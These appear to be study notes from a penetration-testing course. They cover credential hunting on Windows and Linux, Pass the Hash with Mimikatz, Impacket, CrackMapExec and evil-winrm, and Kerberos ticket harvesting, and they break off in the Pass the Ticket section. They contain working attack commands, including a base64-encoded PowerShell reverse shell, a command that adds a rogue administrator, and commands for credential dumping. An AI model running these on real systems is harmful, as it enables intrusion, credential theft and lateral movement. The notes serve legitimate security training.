* With access to the GUI, it is worth attempting to use Windows Search to find files on the target using some of the keywords mentioned above.
* We can also take advantage of third-party tools like Lazagne(https://github.com/AlessandroZ/LaZagne) to quickly discover credentials that web browsers or other installed applications may insecurely store. It would be beneficial to keep a standalone(https://github.com/AlessandroZ/LaZagne/releases/) copy of Lazagne on our attack host so we can quickly transfer it over to the target. Lazagne.exe will do just fine for us in this scenario. We can use our RDP client to copy the file over to the target from our attack host. If we are using xfreerdp all we must do is copy and paste into the RDP session we have established.
    > Once Lazagne.exe is on the target, we can open command prompt or PowerShell, navigate to the directory the file was uploaded to, and execute the following command:
        C:\Users\bob\Desktop> start lazagne.exe all
    > This will execute Lazagne and run all included modules. We can include the option -vv to study what it is doing in the background. Once we hit enter, it will open another prompt and display the results

* Using findstr
    > We can also use findstr to search from patterns across many types of files. Keeping in mind common key terms, we can use variations of this command to discover credentials on a Windows target:
    > Using findstr
        C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
* Additional Considerations

    > There are thousands of tools & key terms we could use to hunt for credentials on Windows operating systems. Know that which ones we choose to use will be primarily based on the function of the computer. If we land on a Windows Server OS, we may use a different approach than if we land on a Windows Desktop OS. Always be mindful of how the system is being used, and this will help us know where to look. Sometimes we may even be able to find credentials by navigating and listing directories on the file system as our tools run.

    > Here are some other places we should keep in mind when credential hunting:

        + Passwords in Group Policy in the SYSVOL share
        + Passwords in scripts in the SYSVOL share
        + Password in scripts on IT shares
        + Passwords in web.config files on dev machines and IT shares
        + unattend.xml
        + Passwords in the AD user or computer description fields
        + KeePass databases --> pull hash, crack and get loads of access.
        + Found on user systems and shares
        + Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint

[+] Linux Local Password Attacks
!Credential Hunting in Linux
    > Hunting for credentials is one of the first steps once we have access to the system. These low-hanging fruits can give us elevated privileges within seconds or minutes. Among other things, this is part of the local privilege escalation process that we will cover here. However, it is important to note here that we are far from covering all possible situations and therefore focus on the different approaches.

    > We can imagine that we have successfully gained access to a system via a vulnerable web application and have therefore obtained a reverse shell, for example. Therefore, to escalate our privileges most efficiently, we can search for passwords or even whole credentials that we can use to log in to our target. There are several sources that can provide us with credentials that we put in four categories. These include, but are not limited to:
    Files	    History	                Memory	    Key-Rings
    Configs	    Logs	                Cache	    Browser stored credentials
    Databases	Command-line History	In-memory   Processing	
    Notes			
    Scripts			
    Source codes			
    Cronjobs			
    SSH Keys

    > Enumerating all these categories will allow us to increase the probability of successfully finding out with some ease credentials of existing users on the system. There are countless different situations in which we will always see different results. Therefore, we should adapt our approach to the circumstances of the environment and keep the big picture in mind. Above all, it is crucial to keep in mind how the system works, its focus, what purpose it exists for, and what role it plays in the business logic and the overall network. For example, suppose it is an isolated database server. In that case, we will not necessarily find normal users there since it is a sensitive interface in the management of data to which only a few people are granted access.
    + Configuration files
        > Configuration files are the core of the functionality of services on Linux distributions. Often they even contain credentials that we will be able to read. Their insight also allows us to understand how the service works and its requirements precisely. Usually, the configuration files are marked with the following three file extensions (.config, .conf, .cnf). However, these configuration files or the associated extension files can be renamed, which means that these file extensions are not necessarily required. Furthermore, even when recompiling a service, the required filename for the basic configuration can be changed, which would result in the same effect. However, this is a rare case that we will not encounter often, but this possibility should not be left out of our search.

        > The most crucial part of any system enumeration is to obtain an overview of it. Therefore, the first step should be to find all possible configuration files on the system, which we can then examine and analyze individually in more detail. There are many methods to find these configuration files, and with the following method, we will see we have reduced our search to these three file extensions.
            cry0l1t3@unixclient:~$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
        > Optionally, we can save the result in a text file and use it to examine the individual files one after the other. Another option is to run the scan directly for each file found with the specified file extension and output the contents. In this example, we search for three words (user, password, pass) in each file with the file extension .cnf.
            cry0l1t3@unixclient:~$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
        > We can apply this simple search to the other file extensions as well. Additionally, we can apply this search type to databases stored in files with different file extensions, and we can then read those.
            cry0l1t3@unixclient:~$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
        > Depending on the environment we are in and the purpose of the host we are on, we can often find notes about specific processes on the system. These often include lists of many different access points or even their credentials. However, it is often challenging to find notes right away if stored somewhere on the system and not on the desktop or in its subfolders. This is because they can be named anything and do not have to have a specific file extension, such as .txt. Therefore, in this case, we need to search for files including the .txt file extension and files that have no file extension at all.
            cry0l1t3@unixclient:~$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
        > Scripts are files that often contain highly sensitive information and processes. Among other things, these also contain credentials that are necessary to be able to call up and execute the processes automatically. Otherwise, the administrator or developer would have to enter the corresponding password each time the script or the compiled program is called.
            cry0l1t3@unixclient:~$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
        > Cronjobs are independent execution of commands, programs, scripts. These are divided into the system-wide area (/etc/crontab) and user-dependent executions. Some applications and scripts require credentials to run and are therefore incorrectly entered in the cronjobs. Furthermore, there are the areas that are divided into different time ranges (/etc/cron.daily, /etc/cron.hourly, /etc/cron.monthly, /etc/cron.weekly). The scripts and files used by cron can also be found in /etc/cron.d/ for Debian-based distributions.
            cry0l1t3@unixclient:~$ cat /etc/crontab 
            cry0l1t3@unixclient:~$ ls -la /etc/cron.*/
        > SSH keys can be considered "access cards" for the SSH protocol used for the public key authentication mechanism. A file is generated for the client (Private key) and a corresponding one for the server (Public key). However, these are not the same, so knowing the public key is insufficient to find a private key. The public key can verify signatures generated by the private SSH key and thus enables automatic login to the server. Even if unauthorized persons get hold of the public key, it is almost impossible to calculate the matching private one from it. When connecting to the server using the private SSH key, the server checks whether the private key is valid and lets the client log in accordingly. Thus, passwords are no longer needed to connect via SSH. Since the SSH keys can be named arbitrarily, we cannot search them for specific names. However, their format allows us to identify them uniquely because, whether public key or private key, both have unique first lines to distinguish them.
            cry0l1t3@unixclient:~$ grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
            cry0l1t3@unixclient:~$ grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
        > All history files provide crucial information about the current and past/historical course of processes. We are interested in the files that store users' command history and the logs that store information about system processes. In the history of the commands entered on Linux distributions that use Bash as a standard shell, we find the associated files in .bash_history. Nevertheless, other files like .bashrc or .bash_profile can contain important information.
            cry0l1t3@unixclient:~$ tail -n5 /home/*/.bash*
        > An essential concept of Linux systems is log files that are stored in text files. Many programs, especially all services and the system itself, write such files. In them, we find system errors, detect problems regarding services or follow what the system is doing in the background. The entirety of log files can be divided into four categories:
        Application Logs 	
        Event Logs 	
        Service Logs 	
        System Logs
        Many different logs exist on the system. These can vary depending on the applications installed, but here are some of the most important ones:
        Log File	        Description
        /var/log/messages	Generic system activity logs.
        /var/log/syslog	    Generic system activity logs.
        /var/log/auth.log	(Debian) All authentication related logs.
        /var/log/secure	    (RedHat/CentOS) All authentication related logs.
        /var/log/boot.log	Booting information.
        /var/log/dmesg	    Hardware and drivers related information and logs.
        /var/log/kern.log	Kernel related warnings, errors and logs.
        /var/log/faillog	Failed login attempts.
        /var/log/cron	    Information related to cron jobs.
        /var/log/mail.log	All mail server related logs.
        /var/log/httpd	    All Apache related logs.
        /var/log/mysqld.log	All MySQL server related logs.

        > Covering the analysis of these log files in detail would be inefficient in this case. So at this point, we should familiarize ourselves with the individual logs, first examining them manually and understanding their formats. However, here are some strings we can use to find interesting content in the logs:
            cry0l1t3@unixclient:~$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

        > Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused. For example, it may be the system-required credentials for the logged-in users. Another example is the credentials stored in the browsers, which can also be read. In order to retrieve this type of information from Linux distributions, there is a tool called mimipenguin(https://github.com/huntergregal/mimipenguin) that makes the whole process easier. However, this tool requires administrator/root permissions.
            cry0l1t3@unixclient:~$ sudo python3 mimipenguin.py
            cry0l1t3@unixclient:~$ sudo bash mimipenguin.sh
        > LaZagne. The passwords and hashes we can obtain come from the following sources but are not limited to:
            			
        Wifi	            Wpa_supplicant	Libsecret	Kwallet
        Chromium-based	    CLI	            Mozilla	    Thunderbird
        Git	                Env_variable	Grub	    Fstab
        AWS	                Filezilla	    Gftp	    SSH
        Apache	            Shadow	        Docker	    KeePass
        Mimipy	            Sessions	    Keyrings	
        > For example, Keyrings are used for secure storage and management of passwords on Linux distributions. Passwords are stored encrypted and protected with a master password. It is an OS-based password manager, which we will discuss later in another section. This way, we do not need to remember every single password and can save repeated password entries.

        > Browsers store the passwords saved by the user in an encrypted form locally on the system to be reused. For example, the Mozilla Firefox browser stores the credentials encrypted in a hidden folder for the respective user. These often include the associated field names, URLs, and other valuable information. For example, when we store credentials for a web page in the Firefox browser, they are encrypted and stored in logins.json on the system. However, this does not mean that they are safe there. Many employees store such login data in their browser without suspecting that it can easily be decrypted and used against the company.
            cry0l1t3@unixclient:~$ ls -l .mozilla/firefox/ | grep default 
            cry0l1t3@unixclient:~$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
        > The tool Firefox Decrypt(https://github.com/unode/firefox_decrypt) is excellent for decrypting these credentials, and is updated regularly. It requires Python 3.9 to run the latest version. Otherwise, Firefox Decrypt 0.7.0 with Python 2 must be used.
            m1l0js@htb[/htb]$ python3.9 firefox_decrypt.py
        > Alternatively, LaZagne can also return results if the user has used the supported browser.
            cry0l1t3@unixclient:~$ python3 laZagne.py browsers


[+] Passwd, Shadow & Opasswd
    > Linux-based distributions can use many different authentication mechanisms. One of the most commonly used and standard mechanisms is Pluggable Authentication Modules (PAM => http://www.linux-pam.org/Linux-PAM-html/Linux-PAM_SAG.html). The modules used for this are called pam_unix.so or pam_unix2.so and are located in /usr/lib/x86_x64-linux-gnu/security/ in Debian based distributions. These modules manage user information, authentication, sessions, current passwords, and old passwords. For example, if we want to change the password of our account on the Linux system with passwd, PAM is called, which takes the appropriate precautions and stores and handles the information accordingly.

    > The pam_unix.so standard module for management uses standardized API calls from the system libraries and files to update the account information. The standard files that are read, managed, and updated are /etc/passwd and /etc/shadow. PAM also has many other service modules, such as LDAP, mount, or Kerberos.
    > Since reading the password hash values can put the entire system in danger, the file /etc/shadow was developed, which has a similar format to /etc/passwd but is only responsible for passwords and their management. It contains all the password information for the created users. For example, if there is no entry in the /etc/shadow file for a user in /etc/passwd, the user is considered invalid. The /etc/shadow file is also only readable by users who have administrator rights.

    > If the password field contains a character, such as ! or *, the user cannot log in with a Unix password. However, other authentication methods for logging in, such as Kerberos or key-based authentication, can still be used. The same case applies if the encrypted password field is empty. This means that no password is required for the login. However, it can lead to specific programs denying access to functions. The encrypted password also has a particular format by which we can also find out some information:

    $<type>$<salt>$<hashed>

    > As we can see here, the encrypted passwords are divided into three parts. The types of encryption allow us to distinguish between the following:
    Algorithm Types
    
        $1$ – MD5
        $2a$ – Blowfish
        $2y$ – Eksblowfish
        $5$ – SHA-256
        $6$ – SHA-512
    
    > By default, the SHA-512 ($6$) encryption method is used on the latest Linux distributions. We will also find the other encryption methods that we can then try to crack on older systems. We will discuss how the cracking works in a bit.

* Opasswd
    > The PAM library (pam_unix.so) can prevent reusing old passwords. The file where old passwords are stored is the /etc/security/opasswd. Administrator/root permissions are also required to read the file if the permissions for this file have not been changed manually.
        m1l0js@htb[/htb]$ sudo cat /etc/security/opasswd
    > Looking at the contents of this file, we can see that it contains several entries for the user cry0l1t3, separated by a comma (,). Another critical point to pay attention to is the hashing type that has been used. This is because the MD5 ($1$) algorithm is much easier to crack than SHA-512. This is especially important for identifying old passwords and maybe even their pattern because they are often used across several services or applications. We increase the probability of guessing the correct password many times over based on its pattern.

[+] Pass the Hash (PtH)
    > A Pass the Hash (PtH) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn't need to decrypt the hash to obtain a plaintext password. PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.
    > As discussed in the previous sections, the attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash. Hashes can be obtained in several ways, including:

        +Dumping the local SAM database from a compromised host.
        +Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
        +Pulling the hashes from memory (lsass.exe).

    ! Example
        > Let's assume we obtain the password hash (64F12CDDAA88057E06A81B54E73B949B) for the account julio from the domain inlanefreight.htb. Let's see how we can perform Pass the Hash attacks from Windows and Linux machines.
        > Note: The tools we will be using are located in the C:\tools directory on the target host. Once you start the machine and complete the exercises, you can use the tools in that directory. This lab contains two machines, you will have access to one (MS01), and from there, you will connect to the second machine (DC01). 

* Windows NTLM Introduction
    > Microsoft's Windows New Technology LAN Manager (NTLM ==> https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview) is a set of security protocols that authenticates users' identities while also protecting the integrity and confidentiality of their data. NTLM is a single sign-on (SSO) solution that uses a challenge-response protocol to verify the user's identity without having them provide a password.
    > Despite its known flaws, NTLM is still commonly used to ensure compatibility with legacy clients and servers, even on modern systems. While Microsoft continues to support NTLM, Kerberos has taken over as the default authentication mechanism in Windows 2000 and subsequent Active Directory (AD) domains.
    > With NTLM, passwords stored on the server and domain controller are not "salted," which means that an adversary with a password hash can authenticate a session without knowing the original password. We call this a Pass the Hash (PtH) Attack.
        
* Example
    > Pass the Hash with Mimikatz (Windows)
        - The first tool we will use to perform a Pass the Hash attack is Mimikatz (https://github.com/gentilkiwi). Mimikatz has a module named sekurlsa::pth that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password. To use this module, we will need the following:
            + /user - The user name we want to impersonate.
            + /rc4 or /NTLM - NTLM hash of the user's password.
            + /domain - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
            + /run - The program we want to run with the user's context (if not specified, it will launch cmd.exe).

            c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit

    > Pass the Hash with PowerShell Invoke-TheHash (Windows)

        - Another tool we can use to perform Pass the Hash attacks on Windows is Invoke-TheHash (https://github.com/Kevin-Robertson/Invoke-TheHash). This tool is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer. For this example we will use the user julio and the hash 64F12CDDAA88057E06A81B54E73B949B.
        - Then using Invoke-TheHash, we have two options: SMB or WMI command execution. To use this tool, we need to specify the following parameters to execute commands in the target computer:
            + Target - Hostname or IP address of the target.
            + Username - Username to use for authentication.
            + Domain - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
            + Hash - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
            + Command - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.
        - The following command will use the SMB method for command execution to create a new user named mark and add the user to the Administrators group.
            PS c:\htb> cd C:\tools\Invoke-TheHash\
            PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
            PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
        - To get a reverse shell, we need to start our listener using Netcat on our Windows machine, which has the IP address 172.16.1.5. We will use port 8001 to wait for the connection.
            PS C:\tools> .\nc.exe -lvnp 8001
        - To create a simple reverse shell using PowerShell, we can visit https://www.revshells.com/, set our IP 172.16.1.5 and port 8001, and select the option PowerShell #3 (base64)
        - Now we can execute Invoke-TheHash to execute our PowerShell reverse shell script in the target computer. Notice that instead of providing the IP address, which is 172.16.1.10, we will use the machine name DC01 (either would work).
        - Invoke-TheHash with WMI
            PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
            PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
        
    > Pass the Hash with Impacket (Linux)

        - Impacket has several tools we can use for different operations such as Command Execution and Credential Dumping, Enumeration, etc. For this example, we will perform command execution on the target machine using PsExec.
        - Pass the Hash with Impacket PsExec
            m1l0js@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
        - There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:
            impacket-wmiexec => (https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
            impacket-atexec => (https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
            impacket-smbexec => (https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

    > Pass the Hash with CrackMapExec (Linux)

        - CrackMapExec(https://github.com/byt3bl33d3r/CrackMapExec) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. We can use CrackMapExec to try to authenticate to some or all hosts in a network looking for one host where we can authenticate successfully as a local admin. This method is also called "Password Spraying" and is covered in-depth in the Active Directory Enumeration & Attacks module. Note that this method can lock out domain accounts, so keep the target domain's account lockout policy in mind and make sure to use the local account method, which will try just one login attempt on a host in a given range using the credentials provided if that is your intent.
        - Pass the Hash with CrackMapExec
            m1l0js@htb[/htb]# crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
        - If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add --local-auth to our command. This method is helpful if we obtain a local administrator hash by dumping the local SAM database on one host and want to check how many (if any) other hosts we can access due to local admin password re-use. If we see Pwn3d!, it means that the user is a local administrator on the target computer. We can use the option -x to execute commands. It is common to see password reuse against many hosts in the same subnet. Organizations will often use gold images with the same local admin password or set this password the same across multiple hosts for ease of administration. If we run into this issue on a real-world engagement, a great recommendation for the customer is to implement the Local Administrator Password Solution (LAPS => https://www.microsoft.com/en-us/download/details.aspx?id=46899), which randomizes the local administrator password and can be configured to have it rotate on a fixed interval.
        - CrackMapExec - Command Execution
            m1l0js@htb[/htb]# crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
        - Review the CrackMapExec documentation Wiki (https://wiki.porchetta.industries/) to learn more about the tool's extensive features.

    > Pass the Hash with evil-winrm (Linux)

        - evil-winrm is another tool we can use to authenticate using the Pass the Hash attack with PowerShell remoting. If SMB is blocked or we don't have administrative rights, we can use this alternative protocol to connect to the target machine.
        - Pass the Hash with evil-winrm
            m1l0js@htb[/htb]$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
        - Note: When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb

    > Pass the Hash with RDP (Linux)
        - We can perform an RDP PtH attack to gain GUI access to the target system using tools like xfreerdp.
        - There are a few caveats to this attack:
            + Restricted Admin Mode, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:
                "Account restrictions are preventing this user from signing in"
                ! This can be enabled by adding a new registry key DisableRestrictedAdmin (REG_DWORD) under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa with the value of 0. It can be done using the following command:
                    # Enable Restricted Admin Mode to Allow PtH
                        c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
                ! Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access:
                    m1l0js@htb[/htb]$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
    > UAC Limits Pass the Hash for Local Accounts

        - UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.
        - Note: There is one exception, if the registry key FilterAdministratorToken (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.
        - These settings are only for local administrative accounts. If we get access to a domain account with administrative rights on a computer, we can still use Pass the Hash with that computer. If you want to learn more about LocalAccountTokenFilterPolicy, you can read Will Schroeder's blog post Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy => (https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167)


[+] Pass the Ticket (PtT) from windows 
    > Another method for moving laterally in an Active Directory environment is called a Pass the Ticket (PtT) attack. In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash. 
* Kerberos Protocol Refresher
    > The Kerberos authentication system is ticket-based. The central idea behind Kerberos is not to give an account password to every service you use. Instead, Kerberos keeps all tickets on your local system and presents each service only the specific ticket for that service, preventing a ticket from being used for another purpose.
        + The TGT - Ticket Granting Ticket is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or TGS.
        + The TGS - Ticket Granting Service is requested by users who want to use a service. These tickets allow services to verify the user's identity.
    > When a user requests a TGT, they must authenticate to the domain controller by encrypting the current timestamp with their password hash. Once the domain controller validates the user's identity (because the domain knows the user's password hash, meaning it can decrypt the timestamp), it sends the user a TGT for future requests. Once the user has their ticket, they do not have to prove who they are with their password.
    > If the user wants to connect to an MSSQL database, it will request a Ticket Granting Service (TGS) to The Key Distribution Center (KDC), presenting its Ticket Granting Ticket (TGT). Then it will give the TGS to the MSSQL database server for authentication.

* Pass the Ticket (PtT) Attack
    > We need a valid Kerberos ticket to perform a Pass the Ticket (PtT). It can be:
        + Service Ticket (TGS - Ticket Granting Service) to allow access to a particular resource.
        + Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.
    > Before we perform a Pass the Ticket (PtT) attack, let's see some methods to get a ticket using Mimikatz and Rubeus.

* Scenario

    > Let's imagine we are on a pentest, and we manage to phish a user and gain access to the user's computer. We found a way to obtain administrative privileges on this computer and are working with local administrator rights. Let's explore several ways we can manage to get access tickets on this computer and how we can create new tickets.
    > Harvesting Kerberos Tickets from Windows
        + On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process. Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it. As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.
        + We can harvest all tickets from a system using the Mimikatz module sekurlsa::tickets /export. The result is a list of files with the extension .kirbi, which contain the tickets.
            privilege::debug
            sekurlsa::tickets /export 
            exit
            dir *.kirbi
            
            Directory: c:\tools
            Mode                LastWriteTime         Length Name
            ----                -------------         ------ ----
            
            <SNIP>
            
            -a----        7/12/2022   9:44 AM           1445 [0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
            -a----        7/12/2022   9:44 AM           1565 [0;3e7]-0-2-40a50000-DC01$@cifs-DC01.inlanefreight.htb.kirbi

        + The tickets that end with $ correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an @ that separates the service name and the domain, for example: [randomvalue]-username@service-domain.local.kirbi.
        + Note: If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.
        + We can also export tickets using Rubeus and the option dump. This option can be used to dump all tickets (if running as a local administrator). Rubeus dump, instead of giving us a file, will print the ticket encoded in base64 format. We are adding the option /nowrap for easier copy-paste.
        + Note: At the time of writing, using Mimikatz version 2.2.0 20220919, if we run "sekurlsa::ekeys" it presents all hashes as des_cbc_md4 on some Windows 10 versions. Exported tickets (sekurlsa::tickets /export) do not work correctly due to the wrong encryption. It is possible to use these hashes to generate new tickets or use Rubeus to export tickets in base64 format.
        + Rubeus - Export tickets 
            c:\tools> Rubeus.exe dump /nowrap
        
        + Note: To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.
        + This is a common way to retrieve tickets from a computer. Another advantage of abusing Kerberos tickets is the ability to forge our own tickets. Let's see how we can do this using the OverPass the Hash or Pass the Key technique.

* Pass the Key or OverPass the Hash
    > The traditional Pass the Hash (PtH) technique involves reusing an NTLM password hash that doesn't touch Kerberos. The Pass the Key or OverPass the Hash approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full Ticket-Granting-Ticket (TGT). This technique was developed by Benjamin Delpy and Skip Duckwall in their presentation Abusing Microsoft Kerberos - Sorry you guys don't get it (https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it/18). Also Will Schroeder(https://twitter.com/harmj0y) adapted their project to create the Rubeus(https://github.com/GhostPack/Rubeus) tool.
    > To forge our tickets, we need to have the user's hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module sekurlsa::ekeys. This module will enumerate all key types present for the Kerberos package.
    > Mimikatz - Extract Kerberos Keys
        privilege::debug
        sekurlsa::ekeys
    > Now that we have access to the AES256_HMAC and RC4_HMAC keys, we can perform the OverPass the Hash or Pass the Key attack using Mimikatz and Rubeus.
    > Mimikatz - Pass the Key or OverPass the Hash
        privilege::debug
        sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
    > This will create a new cmd.exe window that we can use to request access to any service we want in the context of the target user.
    > To forge a ticket using Rubeus, we can use the module asktgt with the username, domain, and hash which can be /rc4, /aes128, /aes256, or /des. In the following example, we use the aes256 hash from the information we collect using Mimikatz sekurlsa::ekeys.
    > Rubeus - Pass the Key or OverPass the Hash
        c:\tools> Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
    > Note: Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.
    > To learn more about the difference between Mimikatz sekurlsa::pth and Rubeus asktgt, consult the Rubeus tool documentation Example for OverPass the Hash ==> (https://github.com/GhostPack/Rubeus#example-over-pass-the-hash)
    > Note: Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use a rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an "encryption downgrade." 

* Pass the Ticket (PtT)

    > Now that we have some Kerberos tickets, we can use them to move laterally within an environment.
    > With Rubeus we performed an OverPass the Hash attack and retrieved the ticket in base64 format. Instead, we could use the flag /ptt to submit the ticket (TGT or TGS) to the current logon session.
    > Rubeus Pass the Ticket
